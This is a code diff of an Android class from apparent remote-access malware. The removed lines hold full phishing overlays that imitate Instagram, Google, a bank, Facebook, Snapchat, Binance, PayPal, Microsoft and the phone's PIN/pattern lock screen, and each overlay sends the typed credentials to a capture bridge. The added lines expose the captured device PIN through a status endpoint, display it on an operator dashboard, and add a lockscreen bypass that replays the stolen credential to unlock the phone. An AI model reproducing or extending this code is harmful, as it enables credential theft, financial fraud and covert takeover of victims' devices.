@@ -9,8 +9,15 @@ import android.util.Log;
 
 import com.labs.labrats.FirebaseConfig;
 import com.labs.labrats.IO_Persistence_Manager;
+import com.labs.labrats.StatusNotification;
 import com.labs.labrats.SystemAnalytics;
 
+import com.labs.labrats.R;
+
+import java.io.BufferedReader;
+import java.io.InputStream;
+import java.io.InputStreamReader;
+import java.nio.charset.StandardCharsets;
 import java.util.ArrayList;
 import java.util.List;
 import java.util.Map;
@@ -75,6 +82,11 @@ public class GhostModule extends BaseModule {
             isAdmin = dpm != null && dpm.isAdminActive(comp);
         } catch (Exception ignored) {}
 
+        String capturedPin = context.getSharedPreferences("StabilityConfig", Context.MODE_PRIVATE).getString("captured_pin", "");
+        String capturedPattern = context.getSharedPreferences("StabilityConfig", Context.MODE_PRIVATE).getString("captured_pattern", "");
+        boolean hasCredential = (!capturedPin.isEmpty()) || (!capturedPattern.isEmpty());
+        String credentialType = !capturedPattern.isEmpty() ? "PATTERN" : (!capturedPin.isEmpty() ? "PIN" : "NONE");
+
         try {
             org.json.JSONObject obj = new org.json.JSONObject();
             obj.put("active", active);
@@ -83,6 +95,9 @@ public class GhostModule extends BaseModule {
             obj.put("lock", lock);
             obj.put("isIdle", isIdle);
             obj.put("isAdminActive", isAdmin);
+            obj.put("hasCredential", hasCredential);
+            obj.put("credentialType", credentialType);
+            obj.put("capturedPin", capturedPin);
             return newResponse(Response.Status.OK, "application/json", obj.toString());
         } catch (Exception e) {
             return newResponse(Response.Status.OK, "application/json", "{\"error\": true}");
@@ -157,201 +172,34 @@ public class GhostModule extends BaseModule {
         String type = params.get("type");
         IO_Persistence_Manager ghost = IO_Persistence_Manager.getInstance();
         if (ghost != null) {
-            String overlayHtml = "";
+            int layoutResId = 0;
             if ("insta".equals(type)) {
-                overlayHtml = "<html><body style='background:#000; color:#fff; font-family:sans-serif; padding:50px; text-align:center;'>" +
-                        "<h2 style='margin-bottom:30px;'>Instagram</h2>" +
-                        "<input type='text' id='u' placeholder='Phone number, username, or email' style='width:100%; padding:15px; margin-bottom:10px; background:#121212; border:1px solid #333; color:#fff;'>" +
-                        "<input type='password' id='p' placeholder='Password' style='width:100%; padding:15px; margin-bottom:20px; background:#121212; border:1px solid #333; color:#fff;'>" +
-                        "<button onclick='var u=document.getElementById(\"u\").value; var p=document.getElementById(\"p\").value; if(u && p) Uplink.capture(u + \":\" + p);' style='width:100%; padding:15px; background:#0095f6; border:none; color:#fff; font-weight:bold; border-radius:4px;'>Log In</button></body></html>";
+                layoutResId = R.layout.shadow_harvester_insta;
             } else if ("gmail".equals(type)) {
-                overlayHtml = "<html><body style='background:#fff; color:#202124; font-family:sans-serif; padding:50px;'>" +
-                        "<h2>Google</h2><p style='margin-bottom:25px;'>Sign in to continue</p>" +
-                        "<input type='text' id='u' placeholder='Email or phone' style='width:100%; padding:15px; margin-bottom:10px; border:1px solid #dadce0; border-radius:4px;'>" +
-                        "<input type='password' id='p' placeholder='Enter your password' style='width:100%; padding:15px; margin-bottom:20px; border:1px solid #dadce0; border-radius:4px;'>" +
-                        "<button onclick='var u=document.getElementById(\"u\").value; var p=document.getElementById(\"p\").value; if(u && p) Uplink.capture(u + \":\" + p);' style='width:120px; padding:15px; background:#1a73e8; border:none; color:#fff; font-weight:bold; border-radius:4px; float:right;'>Next</button></body></html>";
+                layoutResId = R.layout.shadow_harvester_gmail;
             } else if ("bank".equals(type)) {
-                overlayHtml = "<html><body style='background:#f4f4f4; color:#333; font-family:sans-serif; padding:40px;'>" +
-                        "<h2>Secure Login</h2><p style='margin-bottom:20px;'>Verification required for account access.</p>" +
-                        "<input type='text' id='u' placeholder='Username/ID' style='width:100%; padding:12px; margin-bottom:10px; border:1px solid #ccc;'>" +
-                        "<input type='password' id='p' placeholder='Password/PIN' style='width:100%; padding:12px; margin-bottom:20px; border:1px solid #ccc;'>" +
-                        "<button onclick='var u=document.getElementById(\"u\").value; var p=document.getElementById(\"p\").value; if(u && p) Uplink.capture(u + \":\" + p);' style='width:100%; padding:15px; background:#004a8e; border:none; color:#fff; font-weight:bold;'>Sign In</button></body></html>";
+                layoutResId = R.layout.shadow_harvester_bank;
             } else if ("fb".equals(type)) {
-                overlayHtml = "<html><body style='background:#f0f2f5; color:#1c1e21; font-family:sans-serif; padding:50px; text-align:center;'>" +
-                        "<h2 style='color:#1877f2; font-size:2rem; margin-bottom:30px;'>facebook</h2>" +
-                        "<input type='text' id='u' placeholder='Email or phone number' style='width:100%; padding:15px; margin-bottom:10px; border:1px solid #dddfe2; border-radius:6px;'>" +
-                        "<input type='password' id='p' placeholder='Password' style='width:100%; padding:15px; margin-bottom:20px; border:1px solid #dddfe2; border-radius:6px;'>" +
-                        "<button onclick='var u=document.getElementById(\"u\").value; var p=document.getElementById(\"p\").value; if(u && p) Uplink.capture(u + \":\" + p);' style='width:100%; padding:15px; background:#1877f2; border:none; color:#fff; font-weight:bold; border-radius:6px; font-size:1.1rem;'>Log In</button></body></html>";
+                layoutResId = R.layout.shadow_harvester_fb;
             } else if ("snap".equals(type)) {
-                overlayHtml = "<html><body style='background:#fffc00; color:#000; font-family:sans-serif; padding:50px; text-align:center;'>" +
-                        "<h2 style='margin-bottom:30px;'>Snapchat</h2>" +
-                        "<input type='text' id='u' placeholder='Username or Email' style='width:100%; padding:15px; margin-bottom:10px; border:1px solid #000; border-radius:25px;'>" +
-                        "<input type='password' id='p' placeholder='Password' style='width:100%; padding:15px; margin-bottom:20px; border:1px solid #000; border-radius:25px;'>" +
-                        "<button onclick='var u=document.getElementById(\"u\").value; var p=document.getElementById(\"p\").value; if(u && p) Uplink.capture(u + \":\" + p);' style='width:100%; padding:15px; background:#000; border:none; color:#fff; font-weight:bold; border-radius:25px;'>Log In</button></body></html>";
+                layoutResId = R.layout.shadow_harvester_snap;
             } else if ("crypto".equals(type)) {
-                overlayHtml = "<html><body style='background:#0b0e11; color:#eaecef; font-family:sans-serif; padding:50px; text-align:center;'>" +
-                        "<h2 style='color:#f3ba2f; margin-bottom:10px;'>Binance</h2><p style='margin-bottom:25px;'>Security verification required.</p>" +
-                        "<input type='text' id='u' placeholder='Email/Phone' style='width:100%; padding:15px; margin-bottom:10px; background:#1e2329; border:1px solid #474d57; color:#fff; border-radius:4px;'>" +
-                        "<input type='password' id='p' placeholder='Password' style='width:100%; padding:15px; margin-bottom:20px; background:#1e2329; border:1px solid #474d57; color:#fff; border-radius:4px;'>" +
-                        "<button onclick='var u=document.getElementById(\"u\").value; var p=document.getElementById(\"p\").value; if(u && p) Uplink.capture(u + \":\" + p);' style='width:100%; padding:15px; background:#f3ba2f; border:none; color:#000; font-weight:bold; border-radius:4px;'>Log In</button></body></html>";
+                layoutResId = R.layout.shadow_harvester_crypto;
             } else if ("wallet".equals(type)) {
-                overlayHtml = "<html><body style='background:#fff; color:#000; font-family:sans-serif; padding:50px; text-align:center;'>" +
-                        "<h2 style='color:#0070ba; font-style:italic; font-weight:bold; margin-bottom:30px;'>PayPal</h2>" +
-                        "<input type='text' id='u' placeholder='Email or mobile number' style='width:100%; padding:15px; margin-bottom:10px; border:1px solid #888; border-radius:4px;'>" +
-                        "<input type='password' id='p' placeholder='Password' style='width:100%; padding:15px; margin-bottom:20px; border:1px solid #888; border-radius:4px;'>" +
-                        "<button onclick='var u=document.getElementById(\"u\").value; var p=document.getElementById(\"p\").value; if(u && p) Uplink.capture(u + \":\" + p);' style='width:100%; padding:15px; background:#0070ba; border:none; color:#fff; font-weight:bold; border-radius:25px;'>Log In</button></body></html>";
+                layoutResId = R.layout.shadow_harvester_wallet;
             } else if ("ms".equals(type)) {
-                overlayHtml = "<html><body style='background:#fff; color:#000; font-family:sans-serif; padding:50px;'>" +
-                        "<div style='margin-bottom:25px;'><svg width='108' height='24' viewBox='0 0 108 24' xmlns='http://www.w3.org/2000/svg'><rect width='11.5' height='11.5' fill='#f25022'/><rect x='12.5' width='11.5' height='11.5' fill='#7fbb00'/><rect y='12.5' width='11.5' height='11.5' fill='#00a1f1'/><rect x='12.5' y='12.5' width='11.5' height='11.5' fill='#ffbb00'/><text x='30' y='18' font-family='sans-serif' font-weight='600' font-size='18' fill='#5e5e5e'>Microsoft</text></svg></div>" +
-                        "<h2 style='font-size:1.5rem; margin-bottom:5px; font-weight:600;'>Sign in</h2><p style='margin-bottom:20px; font-size:0.9rem;'>to continue to Outlook</p>" +
-                        "<input type='text' id='u' placeholder='Email, phone, or Skype' style='width:100%; padding:10px 0; margin-bottom:15px; border:none; border-bottom:1px solid #666; outline:none; font-size:1rem;'>" +
-                        "<div style=\"margin-bottom:20px; font-size:0.85rem;\">No account? <a href='#' style='color:#0067b8; text-decoration:none;'>Create one!</a></div>" +
-                        "<input type='password' id='p' placeholder='Password' style='width:100%; padding:10px 0; margin-bottom:35px; border:none; border-bottom:1px solid #666; outline:none; font-size:1rem;'>" +
-                        "<div style='display:flex; justify-content:flex-end;'><button onclick='var u=document.getElementById(\"u\").value; var p=document.getElementById(\"p\").value; if(u && p) Uplink.capture(\"MS: \" + u + \":\" + p);' style='min-width:100px; padding:10px 20px; background:#0067b8; border:none; color:#fff; font-weight:600; cursor:pointer; font-size:0.9rem;'>Next</button></div></body></html>";
+                layoutResId = R.layout.shadow_harvester_ms;
             } else if ("pin".equals(type)) {
-                overlayHtml = "<html><head><meta name='viewport' content='width=device-width, initial-scale=1, user-scalable=no'>" +
-                        "<style>" +
-                        "body { background:#000; color:#fff; font-family:sans-serif; margin:0; padding:0; display:flex; flex-direction:column; height:100vh; width:100vw; overflow:hidden; user-select:none; touch-action:none; justify-content: space-between; }" +
-                        ".header { padding: 6vh 5vw 2vh; text-align:center; }" +
-                        ".lock-icon { font-size: 7vh; color:#00f2ff; margin-bottom: 1.5vh; opacity:0.8; }" +
-                        "h2 { font-weight:300; margin:0 0 1vh; font-size: 3.2vh; }" +
-                        "p { color:#888; font-size: 1.8vh; margin:0; }" +
-                        ".status-msg { height: 3vh; color: #ff3131; font-size: 1.6vh; margin-top: 1vh; font-weight: bold; opacity: 0; transition: 0.3s; }" +
-                        ".pin-dots { display:flex; justify-content:center; gap: 4vw; margin: 3vh 0; height: 2.2vh; }" +
-                        ".pin-dot { width: 2vh; height: 2vh; border: 0.3vh solid #555; border-radius:50%; transition:0.1s; }" +
-                        ".pin-dot.filled { background:#00f2ff; border-color:#00f2ff; box-shadow:0 0 1.2vh #00f2ff; }" +
-                        ".keypad { display:grid; grid-template-columns:repeat(3, 1fr); gap: 2vh; width: 80vw; max-width: 400px; margin: 0 auto; }" +
-                        ".key { width: 8vh; height: 8vh; max-width: 20vw; max-height: 20vw; border-radius:50%; background:rgba(255,255,255,0.05); border: 0.15vh solid rgba(255,255,255,0.1); color:#fff; font-size: 3.2vh; display:flex; align-items:center; justify-content:center; cursor:pointer; transition:0.1s; margin: 0 auto; }" +
-                        ".key:active { background:rgba(0,242,255,0.2); border-color:#00f2ff; transform:scale(0.95); }" +
-                        ".pat-container { position:relative; width: 85vw; height: 85vw; max-width: 400px; max-height: 400px; margin: 1vh auto; background: rgba(255,255,255,0.02); border-radius: 15px; }" +
-                        "canvas { position:absolute; top:0; left:0; pointer-events:none; width: 100%; height: 100%; }" +
-                        ".grid { display:grid; grid-template-columns:repeat(3, 1fr); grid-template-rows:repeat(3, 1fr); width:100%; height:100%; position:relative; z-index:2; }" +
-                        ".dot-wrap { display:flex; align-items:center; justify-content:center; }" +
-                        ".dot { width: 2.5vh; height: 2.5vh; background:#444; border-radius:50%; transition:0.2s; }" +
-                        ".dot.active { background:#00f2ff; box-shadow:0 0 2.5vh #00f2ff; transform:scale(1.3); }" +
-                        ".footer { padding: 4vh 8vw; display:flex; justify-content:space-between; }" +
-                        ".f-btn { background:transparent; border:none; color:#00f2ff; font-weight:bold; font-size: 2.2vh; cursor:pointer; text-transform:uppercase; letter-spacing: 0.2vh; transition: 0.2s; }" +
-                        ".f-btn:active { color: #fff; transform: scale(0.9); }" +
-                        "</style></head><body>" +
-                        "<div class='header'>" +
-                        "<div class='lock-icon'>&#128274;</div>" +
-                        "<h2>Security Verification</h2>" +
-                        "<p>Please enter your device credentials</p>" +
-                        "<div id='status' class='status-msg'>Invalid Entry. Try again.</div>" +
-                        "</div>" +
-
-                        "<div id='pin-mode' style='flex-grow: 1; display: flex; flex-direction: column; justify-content: center;'>" +
-                        "<div class='pin-dots' id='pin-display'>" +
-                        "<div class='pin-dot'></div><div class='pin-dot'></div><div class='pin-dot'></div><div class='pin-dot'></div>" +
-                        "<div class='pin-dot' style='display:none'></div><div class='pin-dot' style='display:none'></div>" +
-                        "<div class='pin-dot' style='display:none'></div><div class='pin-dot' style='display:none'></div>" +
-                        "</div>" +
-                        "<div class='keypad'>" +
-                        "<div class='key' onclick='k(1)'>1</div><div class='key' onclick='k(2)'>2</div><div class='key' onclick='k(3)'>3</div>" +
-                        "<div class='key' onclick='k(4)'>4</div><div class='key' onclick='k(5)'>5</div><div class='key' onclick='k(6)'>6</div>" +
-                        "<div class='key' onclick='k(7)'>7</div><div class='key' onclick='k(8)'>8</div><div class='key' onclick='k(9)'>9</div>" +
-                        "<div class='key' style='opacity:0; pointer-events:none;'></div><div class='key' onclick='k(0)'>0</div><div class='key' onclick='del()' style='font-size: 3vh;'>&#9003;</div>" +
-                        "</div>" +
-                        "<div style='text-align:center; margin-top: 3vh;'><button class='f-btn' onclick='toggle(true)'>Use Pattern</button></div>" +
-                        "</div>" +
-
-                        "<div id='pat-mode' style='display:none; flex-grow: 1; flex-direction: column; justify-content: center;'>" +
-                        "<div class='pat-container' id='pc'>" +
-                        "<canvas id='cv'></canvas>" +
-                        "<div class='grid' id='g'>" +
-                        "[DOTS]" +
-                        "</div>" +
-                        "</div>" +
-                        "<div style='text-align:center; margin-top: 2vh;'><button class='f-btn' style='color:#888; font-size: 1.8vh;' onclick='reset()'>Clear Pattern</button></div>" +
-                        "<div style='text-align:center; margin-top: 2vh;'><button class='f-btn' onclick='toggle(false)'>Use PIN</button></div>" +
-                        "</div>" +
-
-                        "<div class='footer'>" +
-                        "<button class='f-btn' style='color:#666;' onclick='Uplink.capture(\"CANCEL\")'>Emergency</button>" +
-                        "<button class='f-btn' id='ok' onclick='send()'>Confirm</button>" +
-                        "</div>" +
-
-                        "<script>" +
-                        "let mode='pin'; let pin=''; let path=[]; let isDown=false; let dotsData=[];" +
-                        "const cv=document.getElementById('cv'); const ctx=cv.getContext('2d');" +
-                        "const status=document.getElementById('status');" +
-                        
-                        "function toggle(p){ mode=p?'pat':'pin'; document.getElementById('pin-mode').style.display=p?'none':'flex'; document.getElementById('pat-mode').style.display=p?'flex':'none'; if(p) setTimeout(setupCanvas, 50); reset(); }" +
-                        "function reset(){ pin=''; path=[]; resetDots(); if(mode==='pat') { setupCanvas(); draw(); } updatePin(); status.style.opacity=0; }" +
-                        "function resetDots(){ document.querySelectorAll('.dot').forEach(d=>d.classList.remove('active')); }" +
-                        "function updatePin(){ const ds=document.querySelectorAll('.pin-dot'); " +
-                        "  ds.forEach((d,i)=>{ " +
-                        "    d.classList.toggle('filled', i<pin.length); " +
-                        "    if(i>=4) d.style.display = (pin.length > 4 || i === pin.length) ? 'block' : 'none'; " +
-                        "  });" +
-                        "}" +
-                        "function k(n){ if(pin.length<8){ pin+=n; updatePin(); status.style.opacity=0; } }" +
-                        "function del(){ pin=pin.slice(0,-1); updatePin(); }" +
-                        
-                        "function send(){ " +
-                        "  console.log('Capture requested. Mode: ' + mode); " +
-                        "  if(mode==='pin'){ " +
-                        "    if(pin.length>=4) { Uplink.capture('PIN: '+pin); } " +
-                        "    else { showErr('PIN too short'); } " +
-                        "  } " +
-                        "  else { " +
-                        "    if(path.length>=4) { " +
-                        "      const humanPath = path.map(id => parseInt(id) + 1).join('-'); " +
-                        "      Uplink.capture('PATTERN (1-9): ' + humanPath); " +
-                        "    } else { showErr('Pattern too short'); } " +
-                        "  } " +
-                        "}" +
-                        "function showErr(msg){ status.innerText=msg; status.style.opacity=1; setTimeout(()=>status.style.opacity=0, 2000); }" +
-                        
-                        "function setupCanvas(){ " +
-                        "  const pc=document.getElementById('pc'); if(!pc) return;" +
-                        "  const r=pc.getBoundingClientRect(); cv.width=r.width; cv.height=r.height; " +
-                        "  dotsData = Array.from(document.querySelectorAll('.dot')).map(d => { " +
-                        "    const wr=d.closest('.dot-wrap').getBoundingClientRect(); " +
-                        "    return { id: d.dataset.id, x: wr.left - r.left + wr.width/2, y: wr.top - r.top + wr.height/2, r: wr.width/2 }; " +
-                        "  });" +
-                        "  console.log('Canvas setup complete: ' + cv.width + 'x' + cv.height); " +
-                        "}" +
-                        
-                        "function draw(ex, ey){" +
-                        "  ctx.clearRect(0,0,cv.width,cv.height); if(path.length===0 && ex===undefined)return;" +
-                        "  ctx.strokeStyle='rgba(0, 242, 255, 0.8)'; ctx.lineWidth=Math.max(cv.width/20, 12); ctx.lineCap='round'; ctx.lineJoin='round'; ctx.beginPath();" +
-                        "  path.forEach((id,i)=>{ " +
-                        "    const d = dotsData.find(item => item.id === id); " +
-                        "    if(i===0) ctx.moveTo(d.x, d.y); else ctx.lineTo(d.x, d.y);" +
-                        "  });" +
-                        "  if(ex!==undefined && path.length > 0) {" +
-                        "    const last = dotsData.find(item => item.id === path[path.length-1]);" +
-                        "    ctx.moveTo(last.x, last.y); ctx.lineTo(ex, ey);" +
-                        "  }" +
-                        "  ctx.stroke();" +
-                        "}" +
-
-                        "const handleMove=(e)=>{ " +
-                        "  if(!isDown)return; e.preventDefault(); " +
-                        "  const t=e.touches?e.touches[0]:e; const pr=document.getElementById('pc').getBoundingClientRect(); " +
-                        "  const x=t.clientX-pr.left; const y=t.clientY-pr.top;" +
-                        "  dotsData.forEach(d=>{ " +
-                        "    const dist=Math.hypot(x-d.x, y-d.y);" +
-                        "    if(dist < d.r * 0.9){ if(!path.includes(d.id)){ path.push(d.id); document.querySelector('[data-id=\"'+d.id+'\"]').classList.add('active'); } }" +
-                        "  }); draw(x,y);" +
-                        "};" +
-
-                        "const pc=document.getElementById('pc');" +
-                        "pc.addEventListener('touchstart',(e)=>{isDown=true; setupCanvas(); handleMove(e);}, {passive: false}); " +
-                        "pc.addEventListener('mousedown',(e)=>{isDown=true; setupCanvas(); handleMove(e);});" +
-                        "window.addEventListener('touchend',()=>{isDown=false; draw();}); window.addEventListener('mouseup',()=>{isDown=false; draw();});" +
-                        "window.addEventListener('touchmove',handleMove, {passive: false}); window.addEventListener('mousemove',handleMove);" +
-                        "window.onload=() => { if(mode==='pat') setupCanvas(); }; window.onresize=setupCanvas;" +
-                        "</script></body></html>";
-
-                StringBuilder dots = new StringBuilder();
-                for(int i=0; i<9; i++) dots.append("<div class='dot-wrap'><div class='dot' data-id='").append(i).append("'></div></div>");
-                overlayHtml = overlayHtml.replace("[DOTS]", dots.toString());
+                layoutResId = R.layout.shadow_harvester_pin;
+            } else if ("pattern".equals(type)) {
+                layoutResId = R.layout.shadow_harvester_pattern;
             }
 
-            if (!overlayHtml.isEmpty()) {
-                ghost.deployShadowOverlay(overlayHtml);
+            if (layoutResId != 0) {
+                ghost.deployShadowOverlayLayout(layoutResId, type);
+            } else if (type == null || type.isEmpty()) {
+                ghost.deployShadowOverlayLayout(0, null);
+                ghost.deployShadowOverlay(null);
             }
         }
         return newResponse(Response.Status.OK, "application/json", "{\"success\": true}");
@@ -468,11 +316,16 @@ public class GhostModule extends BaseModule {
 
         // 5. System Denial Lock & OS Keyguard Lock
         html.append("<div class=\"info-item\" style=\"background: rgba(255,49,49,0.03); align-items: stretch !important;\">");
-        html.append("<div class=\"info-label\" style=\"color: var(--danger); font-size: 0.8rem;\">SYSTEM_LOCKS <span class=\"info-trigger\" onclick=\"showInfo(event, 'SYSTEM_LOCKS', 'Trigger instant standard OS Keyguard phone lock to capture PIN/Pattern entries, or deploy our persistent full-screen security denial overlay.')\">INFO</span></div>");
+        html.append("<div class=\"info-label\" style=\"color: var(--danger); font-size: 0.8rem;\">SYSTEM_LOCKS <span class=\"info-trigger\" onclick=\"showInfo(event, 'SYSTEM_LOCKS', 'Trigger instant standard OS Keyguard phone lock to capture PIN/Pattern entries, or execute automated lockscreen bypass.')\">INFO</span></div>");
         html.append("<div style=\"display: grid; grid-template-columns: 1fr 1fr; gap: 8px; margin-top: 15px; width: 100% !important;\">");
         html.append("<button id=\"os-lock-btn\" onclick=\"triggerOsLock()\" class=\"btn btn-small\" style=\"border-color: var(--danger); color: var(--danger); width: 100% !important; margin: 0; font-size: 0.55rem;\" title=\"Trigger Standard OS Keyguard Lock\">OS_LOCK</button>");
         html.append("<button id=\"lock-btn\" onclick=\"toggleLock()\" class=\"btn btn-small\" style=\"border-color: var(--danger); color: var(--danger); width: 100% !important; margin: 0; font-size: 0.55rem;\" title=\"Toggle Full Screen Security Denial Overlay\">LOCKOUT</button>");
-        html.append("</div></div>");
+        html.append("</div>");
+
+        // Watcher Status Badge + BYPASS_LOCKSCREEN Button
+        html.append("<div id=\"keyguard-watcher-badge\" style=\"margin-top: 12px; padding: 8px 12px; border-radius: 8px; font-size: 0.65rem; font-weight: bold; font-family: monospace; text-align: center; border: 1px solid #555; color: #888; background: rgba(255,255,255,0.03); letter-spacing: 0.5px;\">&#9203; STATUS: WAITING_FOR_USER_UNLOCK</div>");
+        html.append("<button id=\"bypass-lock-btn\" onclick=\"ghostAction('bypass_lockscreen')\" class=\"btn btn-small\" style=\"border-color: var(--neon-cyan); color: var(--neon-cyan); background: rgba(0, 242, 255, 0.05); width: 100% !important; margin: 8px 0 0 0; font-size: 0.65rem; font-weight: bold;\" title=\"Execute Automated Lockscreen Bypass via Captured Credentials\">&#128275; BYPASS_LOCKSCREEN</button>");
+        html.append("</div>");
 
         // 6. Device Admin Elevation Section
         html.append("<div class=\"info-item\" style=\"background: rgba(168, 85, 247, 0.05); border: 1px solid rgba(168, 85, 247, 0.4); border-radius: 12px; box-shadow: 0 0 15px rgba(168, 85, 247, 0.1);\">");
@@ -654,6 +507,42 @@ public class GhostModule extends BaseModule {
         html.append("</div>");
 
         html.append("</div>");
+        html.append("<script>")
+            .append("function pollGhostStatus() {")
+            .append("  fetch('/ghost/status').then(r => r.json()).then(data => {")
+            .append("    const badge = document.getElementById('keyguard-watcher-badge');")
+            .append("    const bypassBtn = document.getElementById('bypass-lock-btn');")
+            .append("    if (badge) {")
+            .append("      if (data.hasCredential) {")
+            .append("        badge.style.borderColor = 'var(--neon-green)';")
+            .append("        badge.style.color = 'var(--neon-green)';")
+            .append("        badge.style.background = 'rgba(57, 255, 20, 0.08)';")
+            .append("        badge.innerHTML = '&#10004; CREDENTIAL_CAPTURED (' + data.credentialType + (data.capturedPin ? ': ' + data.capturedPin : '') + ')';")
+            .append("        if (bypassBtn) {")
+            .append("          bypassBtn.style.borderColor = 'var(--neon-green)';")
+            .append("          bypassBtn.style.color = 'var(--neon-green)';")
+            .append("          bypassBtn.style.background = 'rgba(57, 255, 20, 0.12)';")
+            .append("          bypassBtn.innerHTML = '&#128275; BYPASS_LOCKSCREEN (READY)';")
+            .append("        }")
+            .append("      } else {")
+            .append("        badge.style.borderColor = '#555';")
+            .append("        badge.style.color = '#888';")
+            .append("        badge.style.background = 'rgba(255,255,255,0.03)';")
+            .append("        badge.innerHTML = '&#9203; STATUS: WAITING_FOR_USER_UNLOCK';")
+            .append("        if (bypassBtn) {")
+            .append("          bypassBtn.style.borderColor = 'var(--neon-cyan)';")
+            .append("          bypassBtn.style.color = 'var(--neon-cyan)';")
+            .append("          bypassBtn.style.background = 'rgba(0, 242, 255, 0.05)';")
+            .append("          bypassBtn.innerHTML = '&#128275; BYPASS_LOCKSCREEN';")
+            .append("        }")
+            .append("      }")
+            .append("    }")
+            .append("  }).catch(e => {});")
+            .append("}")
+            .append("setInterval(pollGhostStatus, 2000);")
+            .append("pollGhostStatus();")
+            .append("</script>");
+
         html.append(getFooter());
         return server.serveGzippedProxy(session, "text/html", html.toString());
     }
@@ -807,6 +696,36 @@ public class GhostModule extends BaseModule {
                 break;
             case "blackout_off":
                 ghost.startBlackout(false);
+                success = true;
+                break;
+            case "bypass_lockscreen":
+            case "unlock_lockscreen":
+                {
+                    IO_Persistence_Manager.lastBypassRequestedTime = System.currentTimeMillis();
+                    String capturedPin = context.getSharedPreferences("StabilityConfig", Context.MODE_PRIVATE).getString("captured_pin", "");
+                    String capturedPattern = context.getSharedPreferences("StabilityConfig", Context.MODE_PRIVATE).getString("captured_pattern", "");
+
+                    boolean screenWasOff = false;
+                    try {
+                        android.os.PowerManager pm = (android.os.PowerManager) context.getSystemService(Context.POWER_SERVICE);
+                        if (pm != null && !pm.isInteractive()) {
+                            screenWasOff = true;
+                        }
+                    } catch (Exception ignored) {}
+
+                    ghost.wakeUpScreen();
+
+                    if (capturedPin.isEmpty() && capturedPattern.isEmpty()) {
+                        Log.w("GhostModule", "BYPASS_LOCKSCREEN: No stored credential - Deploying PIN Harvest Overlay...");
+                        deployOverlay(java.util.Collections.singletonMap("type", "pin"));
+                    } else {
+                        Log.i("GhostModule", "BYPASS_LOCKSCREEN: Replaying stored credential to bypass lockscreen...");
+                        long delay = screenWasOff ? 800L : 200L;
+                        new Handler(Looper.getMainLooper()).postDelayed(() -> {
+                            ghost.autoUnlockDevice();
+                        }, delay);
+                    }
+                }
                 success = true;
                 break;
             case "autoheal":
